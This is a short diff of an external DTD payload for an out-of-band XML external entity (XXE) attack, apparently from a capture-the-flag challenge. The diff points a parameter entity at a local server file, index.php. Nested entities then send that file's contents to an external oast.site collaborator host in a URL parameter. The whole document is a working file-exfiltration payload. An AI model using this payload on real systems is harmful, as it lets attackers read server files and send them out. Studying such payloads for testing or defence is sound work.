@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "https://bv2xp1ppse5mhd7twam2x84ra2we9y9bt.oast.site">
+<!ENTITY % file SYSTEM "file:///web-serveur/ch29/index.php">
 <!ENTITY % eval "<!ENTITY &#x25; xvv SYSTEM &#x22;https://7wjojcax4cbuch42j66wx9k1e0svp11nr.oast.site/?x=%file;&#x22;>">
 %eval;
 %xvv;
